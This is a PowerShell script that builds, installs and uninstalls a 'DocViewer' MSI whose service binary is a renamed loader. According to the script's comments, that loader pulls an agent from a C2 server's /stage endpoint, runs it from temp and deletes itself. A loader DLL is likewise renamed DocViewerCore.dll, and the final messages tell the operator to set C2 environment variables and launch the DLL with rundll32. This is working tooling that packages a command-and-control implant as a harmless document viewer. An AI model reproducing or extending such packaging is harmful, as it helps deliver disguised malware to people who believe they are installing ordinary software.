# Build DocViewer MSI (WiX) and optionally install/uninstall on lab VM.
#
#   .\scripts\msi_install_lab.ps1              # build only
#   .\scripts\msi_install_lab.ps1 -Install     # build + msiexec install
#   .\scripts\msi_install_lab.ps1 -Uninstall   # msiexec uninstall if MSI present

param(
    [switch]$Install,
    [switch]$Uninstall,
    [string]$MsiPath = ""
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Root = Split-Path -Parent $ScriptDir
$Package = Join-Path $Root "msi\package.ps1"
$Deploy = Join-Path $Root "deploy"
if (-not $MsiPath) { $MsiPath = Join-Path $Deploy "DocViewer_Setup.msi" }

function Step($m) { Write-Host "[*] $m" -ForegroundColor Cyan }
function Ok($m)   { Write-Host "[+] $m" -ForegroundColor Green }
function Bad($m)  { Write-Host "[-] $m" -ForegroundColor Red }

if ($Uninstall) {
    if (-not (Test-Path $MsiPath)) { throw "MSI not found: $MsiPath" }
    Step "msiexec uninstall $MsiPath"
    $p = Start-Process -FilePath "msiexec.exe" -ArgumentList "/x `"$MsiPath`" /qb /L*v `"$Deploy\msi_uninstall.log`"" -Wait -PassThru
    if ($p.ExitCode -ne 0 -and $p.ExitCode -ne 1605) { throw "uninstall exit $($p.ExitCode) — see deploy\msi_uninstall.log" }
    Ok "uninstall done exit=$($p.ExitCode)"
    exit 0
}

# Ensure stage binaries exist (v1.8 Staged V2: service binary = loader.exe.
# Loader fetches agent.exe from C2 /stage → drops to temp → runs → self-deletes.
# agent.exe is NOT shipped on disk.)
$stage = Join-Path $Deploy "msi_stage"
New-Item -ItemType Directory -Path $stage -Force | Out-Null
$loaderExe = Join-Path $Root "bin\loader.exe"
$loaderDll = Join-Path $Root "bin\loader.dll"
if (Test-Path $loaderExe) {
    Copy-Item $loaderExe (Join-Path $stage "DocViewerHelper.exe") -Force
    Ok "staged DocViewerHelper.exe (loader, Staged V2: fetch->drop->run->delete)"
} else { Bad "bin\loader.exe missing" }
if (Test-Path $loaderDll) {
    Copy-Item $loaderDll (Join-Path $stage "DocViewerCore.dll") -Force
    Ok "staged DocViewerCore.dll"
} else { Bad "bin\loader.dll missing" }

if (-not (Test-Path $Package)) { throw "missing $Package" }

Step "run msi\package.ps1 (WiX candle/light if available)"
& powershell -NoProfile -ExecutionPolicy Bypass -File $Package `
    -ServiceBinary (Join-Path $stage "DocViewerHelper.exe") `
    -LoaderDLL     (Join-Path $stage "DocViewerCore.dll") `
    -IconFile      (Join-Path $Root "deploy\assets\docviewer.ico") `
    -OutputPath    $MsiPath

if (-not (Test-Path $MsiPath)) {
    Write-Host ""
    Write-Host "MSI not produced. Typical cause: WiX Toolset not installed." -ForegroundColor Yellow
    Write-Host "  - WXS is under deploy\msi_stage\DocViewer.wxs"
    Write-Host "  - Install WiX 3.11+ and re-run, or compile manually:"
    Write-Host "      candle -arch x64 DocViewer.wxs"
    Write-Host "      light  -out DocViewer_Setup.msi DocViewer.wixobj"
    exit 2
}
Ok "MSI ready: $MsiPath  size=$((Get-Item $MsiPath).Length)"

if ($Install) {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
        IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) { throw "-Install requires Administrator" }
    Step "msiexec install"
    $log = Join-Path $Deploy "msi_install.log"
    $p = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$MsiPath`" /qb /L*v `"$log`"" -Wait -PassThru
    if ($p.ExitCode -ne 0) { throw "install exit $($p.ExitCode) — see $log" }
    Ok "install exit=0 log=$log"

    $pf = ${env:ProgramFiles}
    $helper = Join-Path $pf "DocViewer\DocViewerHelper.exe"
    $core   = Join-Path $pf "DocViewer\DocViewerCore.dll"
    if (Test-Path $helper) { Ok "installed helper: $helper" } else { Bad "helper missing under Program Files\DocViewer" }
    if (Test-Path $core)   { Ok "installed core:   $core" }   else { Bad "core dll missing" }

    Write-Host ""
    Write-Host "Next: set user/machine C2_* env (or use wmi_live against ProgramData copy)," -ForegroundColor Yellow
    Write-Host "  then rundll32 `"$core`",EntryPoint   OR start helper with C2 env."
}

exit 0
